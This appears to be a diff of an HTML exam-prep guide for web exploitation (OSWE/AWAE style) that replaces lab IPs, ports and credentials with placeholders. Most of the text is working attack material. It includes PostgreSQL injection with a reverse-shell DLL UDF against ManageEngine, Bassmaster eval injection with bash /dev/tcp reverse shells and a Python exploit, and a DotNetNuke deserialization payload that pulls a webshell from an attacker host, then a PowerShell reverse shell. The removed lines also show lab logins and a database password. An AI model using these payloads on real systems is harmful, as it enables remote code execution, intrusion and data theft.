 <li><label><input type="checkbox"> Test the UDF locally via <code>CREATE OR REPLACE FUNCTION</code> and <code>SELECT</code> to confirm code execution</label>
 <pre><code class="language-sql">CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void
-    AS $$C:\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
-SELECT test($$calc.exe$$, 3);</code></pre></li>
+    AS $$C:\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
+SELECT test($$[command]$$, [integer-argument]);</code></pre></li>
 <li><label><input type="checkbox"> Host the compiled DLL on an attacker SMB share and load it remotely via UNC path</label>
-<pre><code class="language-bash">sudo impacket-smbserver awae /home/kali/awae/</code></pre></li>
+<pre><code class="language-bash">sudo impacket-smbserver [share-name] [local-path]</code></pre></li>
 <li><label><input type="checkbox"> Create a reverse shell UDF with Winsock (<code>WSASocket</code>, <code>WSAConnect</code>, <code>CreateProcess</code>) that accepts IP and port as function arguments</label></li>
 <li><label><input type="checkbox"> For environments without SMB access, use PostgreSQL Large Objects to transfer the DLL binary through SQL injection</label>
-<pre><code class="language-sql">SELECT lo_import($$C:\\awae.dll$$, 1337);
-SELECT lo_export(1337, $$C:\\target_path\\rev_shell.dll$$);</code></pre></li>
+<pre><code class="language-sql">SELECT lo_import($$C:\\[dll-name].dll$$, 1337);
+SELECT lo_export(1337, $$C:\\[target-path]\\[dll-name].dll$$);</code></pre></li>
 <li><label><input type="checkbox"> Start a netcat listener and trigger the reverse shell UDF</label>
-<pre><code class="language-bash">nc -nlvp 4444
+<pre><code class="language-bash">nc -nlvp [listener-port]
 # Then via injection:
-# SELECT rev_shell($$[attacker-ip]$$, 4444);</code></pre></li>
+# SELECT rev_shell($$[attacker-ip]$$, [listener-port]);</code></pre></li>
 </ul>
 
 <h3 id="oswe-manageengine-largeobjects">4.7 Large Objects for File Transfer</h3>
@@ -1958,9 +1958,9 @@ SELECT lo_unlink(1337);</code></pre>
 <tr><td>2</td><td>Create large object from arbitrary file</td><td><code>SELECT lo_import($$C:\\windows\\win.ini$$, 1337)</code></td></tr>
 <tr><td>3</td><td>Update page 0 with first 2KB of DLL</td><td><code>UPDATE pg_largeobject SET data=decode($$HEX$$, $$hex$$) WHERE loid=1337 AND pageno=0</code></td></tr>
 <tr><td>4</td><td>Insert additional pages for remaining chunks</td><td><code>INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1337, N, decode($$HEX$$, $$hex$$))</code></td></tr>
-<tr><td>5</td><td>Export to filesystem</td><td><code>SELECT lo_export(1337, $$C:\\Users\\Public\\rev_shell.dll$$)</code></td></tr>
+<tr><td>5</td><td>Export to filesystem</td><td><code>SELECT lo_export(1337, $$C:\\[writable-path]\\[dll-name].dll$$)</code></td></tr>
 <tr><td>6</td><td>Create UDF from exported DLL</td><td><code>CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$...$$ LANGUAGE C STRICT</code></td></tr>
-<tr><td>7</td><td>Trigger reverse shell</td><td><code>SELECT rev_shell($$[attacker-ip]$$, 4444)</code></td></tr>
+<tr><td>7</td><td>Trigger reverse shell</td><td><code>SELECT rev_shell($$[attacker-ip]$$, [listener-port])</code></td></tr>
 </tbody>
 </table>
 
@@ -2003,12 +2003,12 @@ def inject_udf(url, loid):
 
 def export_udf(url, loid):
     log("[+] Exporting UDF library to filesystem...")
-    sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid
+    sql = "SELECT lo_export(%d, $$C:\\[writable-path]\\[dll-name].dll$$)" % loid
     make_request(url, sql)
 
 def create_udf_func(url):
     log("[+] Creating function...")
-    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT"
+    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$C:\\[writable-path]\\[dll-name].dll$$, $$connect_back$$ LANGUAGE C STRICT"
     make_request(url, sql)
 
 def trigger_udf(url, ip, port):
@@ -2022,7 +2022,7 @@ if __name__ == '__main__':
         attacker = sys.argv[2].strip()
         port = sys.argv[3].strip()
     except IndexError:
-        print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+        print("[-] Usage: %s [target-ip]:[port] [attacker-ip] [listener-port]" % sys.argv[0])
         sys.exit()
 
     sqli_url = "https://" + server + "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;%s;--"
@@ -2045,23 +2045,23 @@ if __name__ == '__main__':
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-2"> Enable PostgreSQL query logging (<code>log_statement = 'all'</code> in <code>postgresql.conf</code>) and restart the service to monitor injected statements</label></li>
   <li><label><input type="checkbox" data-id="oswe-4-3"> Confirm injection with semicolon or time-based payload</label>
-    <pre><code class="language-bash">curl -k "https://[target-ip]:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;SELECT+pg_sleep(10);--+"</code></pre>
+    <pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;SELECT+pg_sleep(10);--+"</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-4"> Verify DBA privileges with time-based check</label>
     <pre><code class="language-sql">SELECT CASE WHEN (SELECT current_setting($$is_superuser$$))=$$on$$ THEN pg_sleep(10) END;</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-5"> Write files via COPY TO or overwrite application scripts</label>
-    <pre><code class="language-sql">COPY (SELECT $$payload$$) TO $$C:\\output.txt$$;</code></pre>
+    <pre><code class="language-sql">COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-6"> Upload UDF via Large Objects (split into 2KB pages, hex-encode)</label>
     <pre><code class="language-sql">SELECT lo_import($$C:\\windows\\win.ini$$, 1337);
 UPDATE pg_largeobject SET data=decode($$HEX$$, $$hex$$) WHERE loid=1337 AND pageno=0;
-SELECT lo_export(1337, $$C:\\Users\\Public\\rev_shell.dll$$);</code></pre>
+SELECT lo_export(1337, $$C:\\[writable-path]\\[dll-name].dll$$);</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-7"> Register the UDF and call it for RCE</label>
     <pre><code class="language-sql">CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void
-    AS $$C:\Users\Public\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT;
-SELECT rev_shell($$[attacker-ip]$$, 4444);</code></pre>
+    AS $$C:\[writable-path]\[dll-name].dll$$, $$connect_back$$ LANGUAGE C STRICT;
+SELECT rev_shell($$[attacker-ip]$$, [listener-port]);</code></pre>
   </li>
 </ul>
 
@@ -2102,7 +2102,7 @@ ls node_modules/bassmaster/</code></pre></li>
 <pre><code class="language-bash">grep -rn "batchEndpoint" node_modules/bassmaster/
 grep -rn "bassmaster" server.js app.js index.js 2>/dev/null</code></pre></li>
 <li><label><input type="checkbox"> Verify the batch endpoint accepts POST requests with JSON body</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Review the <code>eval()</code> sink in <code>lib/batch.js</code> to confirm user input reaches it without sanitization</label>
@@ -2186,7 +2186,7 @@ grep -rn "batchEndpoint" --include="*.js" .</code></pre></li>
 }</code></pre>
 
 <pre><code class="language-bash"># Send a batch request
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/api/users/2"}]}'</code></pre>
 
@@ -2223,11 +2223,11 @@ curl -s -X POST http://[target-ip]:8080/batch \
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Send a basic batch request with two independent sub-requests to confirm the endpoint works</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/api/users/2"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Test inter-request references using <code>$0.property</code> syntax to confirm reference resolution works</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/api/users/$0.id"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Inspect the reference resolution logic in <code>lib/batch.js</code> for how <code>$N</code> references are parsed and resolved</label>
@@ -2313,7 +2313,7 @@ diff node_modules/bassmaster/lib/batch.js /path/to/fixed/batch.js</code></pre></
 <h4 id="oswe-bassmaster-poc">5.0.5 Proof of Concept</h4>
 
 <pre><code class="language-bash"># PoC: execute arbitrary JavaScript via batch reference
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{
     "requests": [
@@ -2327,7 +2327,7 @@ curl -s -X POST http://[target-ip]:8080/batch \
 <p>A simpler injection path uses <code>require()</code> directly, since Node.js makes it available in the <code>eval()</code> scope:</p>
 
 <pre><code class="language-bash"># Direct require() injection
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{
     "requests": [
@@ -2350,7 +2350,7 @@ curl -s -X POST http://[target-ip]:8080/batch \
 </table>
 
 <pre><code class="language-bash"># Read /etc/passwd via execSync
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{
     "requests": [
@@ -2360,7 +2360,7 @@ curl -s -X POST http://[target-ip]:8080/batch \
 }'</code></pre>
 
 <pre><code class="language-bash"># Enumerate system information
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{
     "requests": [
@@ -2373,25 +2373,25 @@ curl -s -X POST http://[target-ip]:8080/batch \
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Send a PoC batch request using the <code>Function</code> constructor to confirm JavaScript execution</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.constructor.constructor(\"return 1+1\")()"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Use <code>require("child_process").execSync()</code> to execute OS commands and confirm output</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").execSync(\"id\").toString()"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Exfiltrate system information (<code>id</code>, <code>uname -a</code>, <code>/etc/passwd</code>) to map the execution context</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").execSync(\"id && uname -a && cat /etc/passwd\").toString()"}]}'</code></pre></li>
 <li><label><input type="checkbox"> Start a netcat listener and send a reverse shell payload to obtain interactive access</label>
 <pre><code class="language-bash"># On attacker
-nc -nlvp 4444
+nc -nlvp [listener-port]
 
 # Reverse shell via batch injection
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
-  -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/4444 0>&1\\\"\")"}]}'</code></pre></li>
+  -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/[listener-port] 0>&1\\\"\")"}]}'</code></pre></li>
 </ul>
 
 <h3 id="oswe-bassmaster-reverse-shell">Obtaining a Reverse Shell</h3>
@@ -2399,15 +2399,15 @@ curl -s -X POST http://[target-ip]:8080/batch \
 <p>For a stable reverse shell, use the asynchronous <code>exec()</code> method with a bash reverse shell one-liner. The shell command must be properly escaped for JSON and JavaScript string contexts.</p>
 
 <pre><code class="language-bash"># Start a listener on the attacker machine
-nc -lvnp 4444</code></pre>
+nc -lvnp [listener-port]</code></pre>
 
 <pre><code class="language-bash"># Trigger reverse shell via Bassmaster injection
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{
     "requests": [
         { "method": "get", "path": "/api/users/1" },
-        { "method": "get", "path": "/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/4444 0>&1\\\"\")" }
+        { "method": "get", "path": "/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/[listener-port] 0>&1\\\"\")" }
     ]
 }'</code></pre>
 
@@ -2470,7 +2470,7 @@ def reverse_shell(target, lhost, lport, batch_path="/batch", api_path="/api/user
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Bassmaster eval() injection exploit")
-    parser.add_argument("target", help="Target URL (e.g., http://10.10.10.10:8080)")
+    parser.add_argument("target", help="Target URL (e.g., http://[target-ip]:[port])")
     parser.add_argument("lhost", help="Attacker IP for reverse shell callback")
     parser.add_argument("lport", type=int, help="Attacker port for reverse shell callback")
     parser.add_argument("--batch", default="/batch", help="Batch endpoint path (default: /batch)")
@@ -2485,10 +2485,10 @@ if __name__ == "__main__":
         print("[-] Aborting — target not vulnerable")</code></pre>
 
 <pre><code class="language-bash"># Usage
-python3 bassmaster_exploit.py http://[target-ip]:8080 [attacker-ip] 4444
+python3 bassmaster_exploit.py http://[target-ip]:[port] [attacker-ip] [listener-port]
 
 # Check only (no shell)
-python3 bassmaster_exploit.py http://[target-ip]:8080 [attacker-ip] 4444 --check</code></pre>
+python3 bassmaster_exploit.py http://[target-ip]:[port] [attacker-ip] [listener-port] --check</code></pre>
 
 <h4 id="oswe-bassmaster-methodology">Methodology</h4>
 <ul class="methodology-checklist">
@@ -2496,27 +2496,27 @@ python3 bassmaster_exploit.py http://[target-ip]:8080 [attacker-ip] 4444 --check
 <li><label><input type="checkbox" data-id="oswe-bass-1"> Confirm Bassmaster version is &lt;= 1.5.1</label>
 <pre><code class="language-bash">cat node_modules/bassmaster/package.json | grep version</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-2"> Locate the batch endpoint (default <code>/batch</code>, check server configuration for custom <code>batchEndpoint</code>)</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/"}]}'</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-3"> Trace the reference resolution code in <code>lib/batch.js</code> and confirm <code>eval()</code> usage</label>
 <pre><code class="language-bash">grep -n "eval(" node_modules/bassmaster/lib/batch.js</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-4"> Send a PoC batch request that triggers code execution via the <code>$0</code> reference</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").execSync(\"id\").toString()"}]}'</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-5"> Exfiltrate system information to confirm execution context</label>
-<pre><code class="language-bash">curl -s -X POST http://[target-ip]:8080/batch \
+<pre><code class="language-bash">curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").execSync(\"id && cat /etc/passwd\").toString()"}]}'</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-6"> Start a netcat listener and send the reverse shell payload</label>
 <pre><code class="language-bash"># Listener
-nc -lvnp 4444
+nc -lvnp [listener-port]
 
 # Trigger
-curl -s -X POST http://[target-ip]:8080/batch \
+curl -s -X POST http://[target-ip]:[port]/batch \
   -H "Content-Type: application/json" \
-  -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/4444 0>&1\\\"\")"}]}'</code></pre></li>
+  -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/[listener-port] 0>&1\\\"\")"}]}'</code></pre></li>
 <li><label><input type="checkbox" data-id="oswe-bass-7"> Stabilize the shell and escalate privileges if needed</label>
 <pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -2539,8 +2539,8 @@ stty raw -echo; fg</code></pre></li>
 <table class="custom-table">
 <thead><tr><th>Access</th><th>URL / Host</th><th>Username</th><th>Password</th></tr></thead>
 <tbody>
-<tr><td>DNN Web</td><td><code>http://dnn/dotnetnuke</code></td><td>administrator</td><td>studentlab</td></tr>
-<tr><td>RDP</td><td><code>rdp://dnn</code></td><td>administrator</td><td>studentlab</td></tr>
+<tr><td>DNN Web</td><td><code>http://[target-hostname]/[application-path]</code></td><td>[username]</td><td>[password]</td></tr>
+<tr><td>RDP</td><td><code>rdp://[target-hostname]</code></td><td>[username]</td><td>[password]</td></tr>
 </tbody>
 </table>
 
@@ -2629,7 +2629,7 @@ namespace BasicXMLDeserializer
 BasicXMLSerializer.exe "Hello AWAE"
 
 # Run the deserializer — setter fires automatically
-BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"
+BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"
 # Output: My first console text class says: Hello AWAE</code></pre>
 
 <h4 id="oswe-dnn-expanded-xml">6.1.3 Expanded XmlSerializer (Dynamic Type Resolution)</h4>
@@ -2722,7 +2722,7 @@ public class ExecCMD
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Connect to the DNN VM via RDP and start Burp Suite</label>
-<pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:dnn /size:1180x708</code></pre></li>
+<pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-hostname] /size:1180x708</code></pre></li>
 <li><label><input type="checkbox"> Build and run the basic <code>XmlSerializer</code> example to confirm serialization/deserialization behavior</label>
 <pre><code class="language-bash"># Compile serializer and deserializer
 csc.exe BasicXMLSerializer.cs
@@ -2730,7 +2730,7 @@ csc.exe /r:BasicXMLSerializer.exe BasicXMLDeserializer.cs
 
 # Test: setter fires during deserialization
 BasicXMLSerializer.exe "Hello AWAE"
-BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"</code></pre></li>
+BasicXMLDeserializer.exe "C:\[writable-path]\[xml-file].txt"</code></pre></li>
 <li><label><input type="checkbox"> Build the expanded serializer with dynamic type resolution and verify type substitution via <code>objectType</code> attribute</label></li>
 <li><label><input type="checkbox"> Build the <code>ExecCMD</code> class with a code-executing property setter and confirm <code>calc.exe</code> launches during deserialization</label></li>
 <li><label><input type="checkbox"> Verify that <code>XmlSerializer</code> only serializes public properties/fields and requires known types at instantiation time</label></li>
@@ -2787,7 +2787,7 @@ BasicXMLDeserializer.exe "C:\Users\Public\basicXML.txt"</code></pre></li>
 # 7. Navigate to PersonalizationController.LoadProfile, set breakpoint on line 24
 
 # Connect to DNN VM via RDP
-xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:dnn /size:1180x708</code></pre>
+xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-hostname] /size:1180x708</code></pre>
 
 
 <h4>Methodology</h4>
@@ -2832,7 +2832,7 @@ ObjectDataProvider myODP = new ObjectDataProvider();
 myODP.ObjectInstance = new FileSystemUtils();
 myODP.MethodName = "PullFile";
 myODP.MethodParameters.Add("http://[attacker-ip]/shell.aspx");
-myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/shell.aspx");</code></pre>
+myODP.MethodParameters.Add("[web-root]/[webshell-name].aspx");</code></pre>
 
 <p><code>ObjectDataProvider</code> does not violate any <code>XmlSerializer</code> limitations — all the critical values (<code>ObjectInstance</code>, <code>MethodName</code>, <code>MethodParameters</code>) are public properties. The <code>InvokeMethodOnInstance</code> breakpoint is hit three times: once for <code>MethodName</code> and once for each <code>MethodParameters.Add</code> call.</p>
 
@@ -2876,7 +2876,7 @@ namespace ExpWrapSerializer
             myExpWrap.ProjectedProperty0.MethodParameters.Add(
                 "http://[attacker-ip]/shell.aspx");
             myExpWrap.ProjectedProperty0.MethodParameters.Add(
-                "C:/inetpub/wwwroot/dotnetnuke/shell.aspx");
+                "[web-root]/[webshell-name].aspx");
 
             Hashtable table = new Hashtable();
             table["myTableEntry"] = myExpWrap;
@@ -2906,7 +2906,7 @@ Globals.DeserializeHashTableXml(xmlSource);
 myODP.ObjectInstance = new FileSystemUtils();
 myODP.MethodName = "PullFile";
 myODP.MethodParameters.Add("http://[attacker-ip]/shell.aspx");
-myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/shell.aspx");</code></pre></li>
+myODP.MethodParameters.Add("[web-root]/[webshell-name].aspx");</code></pre></li>
 <li><label><input type="checkbox"> Confirm direct serialization of <code>ObjectDataProvider</code> fails because <code>XmlSerializer</code> does not know about the wrapped <code>FileSystemUtils</code> type</label></li>
 <li><label><input type="checkbox"> Wrap <code>ObjectDataProvider</code> inside <code>ExpandedWrapper&lt;FileSystemUtils, ObjectDataProvider&gt;</code> to pass type information to <code>XmlSerializer</code></label></li>
 <li><label><input type="checkbox"> Compile the serializer with <code>ExpandedWrapper</code>, generate the payload XML, and verify it matches the <code>profile/item</code> structure DNN expects</label></li>
@@ -2935,8 +2935,8 @@ myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/shell.aspx");</code></
         &lt;ObjectInstance xsi:type="FileSystemUtils" /&gt;
         &lt;MethodName&gt;PullFile&lt;/MethodName&gt;
         &lt;MethodParameters&gt;
-          &lt;anyType xsi:type="xsd:string"&gt;http://[attacker-ip]/cmdasp.aspx&lt;/anyType&gt;
-          &lt;anyType xsi:type="xsd:string"&gt;C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx&lt;/anyType&gt;
+          &lt;anyType xsi:type="xsd:string"&gt;http://[attacker-ip]/[webshell-name].aspx&lt;/anyType&gt;
+          &lt;anyType xsi:type="xsd:string"&gt;[web-root]/[webshell-name].aspx&lt;/anyType&gt;
         &lt;/MethodParameters&gt;
       &lt;/ProjectedProperty0&gt;
     &lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&gt;
@@ -2947,23 +2947,23 @@ myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/shell.aspx");</code></
 <p>Host an ASPX webshell on the attacker machine and send the serialized payload as the <code>DNNPersonalization</code> cookie. The request must target a nonexistent page to trigger the 404 handler that leads to <code>LoadProfile</code>.</p>
 
 <pre><code class="language-bash"># Set up the attacker web server with an ASPX webshell
-sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/
-sudo chmod 644 /var/www/html/cmdasp.aspx
+sudo cp /usr/share/webshells/aspx/[webshell-name].aspx /var/www/html/
+sudo chmod 644 /var/www/html/[webshell-name].aspx
 sudo systemctl start apache2</code></pre>
 
 <pre><code class="language-bash"># Send the payload — request a nonexistent page to trigger LoadProfile via 404 handler
-curl -b "DNNPersonalization=PAYLOAD_XML" http://[target-ip]/dotnetnuke/nonexistent.aspx
+curl -b "DNNPersonalization=[payload-xml]" http://[target-ip]/[application-path]/nonexistent.aspx
 
 # Verify: attacker web server log should show:
-# [target-ip] - - "GET /cmdasp.aspx HTTP/1.1" 200 1662</code></pre>
+# [target-ip] - - "GET /[webshell-name].aspx HTTP/1.1" 200 1662</code></pre>
 
-<p>After the request, the ASPX webshell is downloaded to <code>C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</code> and can be accessed directly in a browser at <code>http://[target-ip]/dotnetnuke/cmdasp.aspx</code>.</p>
+<p>After the request, the ASPX webshell is downloaded to <code>[web-root]/[webshell-name].aspx</code> and can be accessed directly in a browser at <code>http://[target-ip]/[application-path]/[webshell-name].aspx</code>.</p>
 
 <h4 id="oswe-dnn-revshell">6.4.3 Reverse Shell</h4>
 <p>Use the uploaded webshell to execute a PowerShell reverse shell. Encode the payload to base64 using UTF-16LE (PowerShell's expected encoding) to avoid quoting and character issues.</p>
 
 <pre><code class="language-bash"># PowerShell reverse shell one-liner (save to powershellcmd.txt)
-$client = New-Object System.Net.Sockets.TCPClient('[attacker-ip]',4444);
+$client = New-Object System.Net.Sockets.TCPClient('[attacker-ip]',[listener-port]);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -2982,8 +2982,8 @@ cat powershellcmd.txt | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
 powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...</code></pre>
 
 <pre><code class="language-bash"># Catch the reverse shell on the attacker machine
-nc -lvp 4444
-# connect to [[attacker-ip]] from WIN-xxxxx [[target-ip]] 54654
+nc -lvp [listener-port]
+# connect to [attacker-ip] from WIN-xxxxx [target-ip] 54654
 # whoami
 # iis apppool\defaultapppool</code></pre>
 
@@ -3010,21 +3010,21 @@ wrapper.ProjectedProperty0 = new ObjectDataProvider();
 wrapper.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
 wrapper.ProjectedProperty0.MethodName = "PullFile";
 wrapper.ProjectedProperty0.MethodParameters.Add("http://[attacker-ip]/shell.aspx");
-wrapper.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/shell.aspx");</code></pre>
+wrapper.ProjectedProperty0.MethodParameters.Add("[web-root]/[webshell-name].aspx");</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-6-5"> Serialize payload using XmlUtils.SerializeDictionary with "profile" root node</label></li>
   <li><label><input type="checkbox" data-id="oswe-6-6"> Host ASPX webshell on attacker web server</label>
-    <pre><code class="language-bash">sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/
+    <pre><code class="language-bash">sudo cp /usr/share/webshells/aspx/[webshell-name].aspx /var/www/html/
 sudo systemctl start apache2</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-6-7"> Send malicious cookie to a nonexistent DNN page</label>
-    <pre><code class="language-bash">curl -b "DNNPersonalization=PAYLOAD_XML" http://[target-ip]/dotnetnuke/nonexistent.aspx</code></pre>
+    <pre><code class="language-bash">curl -b "DNNPersonalization=[payload-xml]" http://[target-ip]/[application-path]/nonexistent.aspx</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-6-8"> Access uploaded webshell and execute reverse shell</label>
     <pre><code class="language-bash"># Encode PowerShell reverse shell
 iconv -f ASCII -t UTF-16LE payload.txt | base64 | tr -d "\n"
-# Execute: powershell.exe -EncodedCommand ENCODED_PAYLOAD
-# Catch shell: nc -lvp 4444</code></pre>
+# Execute: powershell.exe -EncodedCommand [encoded-payload]
+# Catch shell: nc -lvp [listener-port]</code></pre>
   </li>
 </ul>
 
@@ -3081,13 +3081,13 @@ iconv -f ASCII -t UTF-16LE payload.txt | base64 | tr -d "\n"
 <p>Password reset exploitation requires the application to send emails. Configure Frappe to route emails through the attacker's SMTP server by editing the site configuration file on the ERPNext server.</p>
 
 <pre><code class="language-json">{
- "db_name": "_1bd3e0294da19198",
- "db_password": "32ldabYvxQanK4jj",
+ "db_name": "[database-name]",
+ "db_password": "[database-password]",
  "db_type": "mariadb",
  "mail_server": "[attacker-ip]",
  "use_ssl": 0,
  "mail_port": 25,
- "auto_email_id": "admin@randomdomain.com"
+ "auto_email_id": "[admin-email]"
 }</code></pre>
 
 <pre><code class="language-bash"># Start SMTP debug server on Kali to receive password reset emails
@@ -3372,29 +3372,29 @@ def web_search(text, scope=None, start=0, limit=20):
 <h4 id="oswe-erpnext-sqli-exploit">7.4.1 Exploiting the SQLi</h4>
 <p>The initial baseline query (without scope) produces a clean SELECT. Setting <code>scope</code> injects into the <code>WHERE</code> clause inside a double-quoted <code>LIKE</code> string, which can be terminated with a closing double quote to inject a UNION query. The comment character <code>#</code> comments out the remainder.</p>
 
-<pre><code class="language-sql">-- Baseline query (text=offsec, no scope)
+<pre><code class="language-sql">-- Baseline query (text=[search-term], no scope)
